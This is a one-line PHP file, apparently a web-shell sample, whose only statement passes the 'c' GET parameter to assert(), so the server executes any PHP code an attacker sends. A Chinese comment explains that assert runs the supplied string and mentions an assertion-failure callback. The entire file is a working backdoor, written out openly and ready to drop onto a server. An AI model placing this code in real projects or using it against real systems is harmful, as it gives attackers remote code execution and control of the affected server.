<?php
//assert执行传过来的字符串，断言失败时，设置了assert_options(ASSERT_CALLBACK, 'my_assert_handler');，调用自定义函数
assert($_GET['c']);
?>